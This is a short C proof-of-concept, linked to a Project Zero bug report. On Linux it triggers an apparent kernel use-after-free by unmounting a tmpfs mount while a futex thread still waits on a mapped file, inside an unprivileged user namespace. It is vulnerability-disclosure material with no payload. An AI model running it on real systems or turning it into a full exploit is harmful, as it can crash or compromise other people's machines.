// ref:
//   - https://bugs.chromium.org/p/project-zero/issues/detail?id=2015
// compile:
//   - gcc -pthread -o poc poc.c
#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>

static void write_file(char *name, char *buf) {
    int fd = open(name, O_WRONLY);
    if (fd == -1)
        err(1, "open %s", name);
    if (write(fd, buf, strlen(buf)) != strlen(buf))
        err(1, "write %s", name);
    close(fd);
}

static void write_map(char *name, int outer_id) {
    char buf[100];
    sprintf(buf, "0 %d 1", outer_id);
    write_file(name, buf);
}

static char *mapping;

static void *futex_thread(void *dummy) {
    printf("entering FUTEX_WAIT\n");
    struct timespec timeout = {.tv_sec = 3};
    syscall(SYS_futex, mapping, FUTEX_WAIT, 0, &timeout, /*ignored*/ 0,
            /*ignored*/ 0);
    printf("FUTEX_WAIT returned; ASAN should have triggered at this point\n");
    return NULL;
}

int main(void) {
    int outer_uid = getuid();
    int outer_gid = getgid();
    if (unshare(CLONE_NEWNS | CLONE_NEWUSER))
        err(1, "unshare");
    write_file("/proc/self/setgroups", "deny");
    write_map("/proc/self/uid_map", outer_uid);
    write_map("/proc/self/gid_map", outer_gid);

    if (mount("none", "/tmp", "tmpfs", 0, ""))
        err(1, "mount");
    int fd = open("/tmp/x", O_RDWR | O_CREAT, 0600);
    if (fd == -1)
        err(1, "create /tmp/x");
    if (ftruncate(fd, 0x1000))
        err(1, "ftruncate");
    mapping = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mapping == MAP_FAILED)
        err(1, "mmap");
    close(fd);

    pthread_t thread;
    if (pthread_create(&thread, NULL, futex_thread, NULL))
        errx(1, "pthread_create");

    sleep(1);
    printf("nuking the mount...\n");
    if (munmap(mapping, 0x1000))
        err(1, "munmap");
    if (umount("/tmp"))
        err(1, "umount");
    printf("umount done; VFS should have complained at this point\n");

    if (pthread_join(thread, NULL))
        err(1, "pthread_join");
    return 0;
}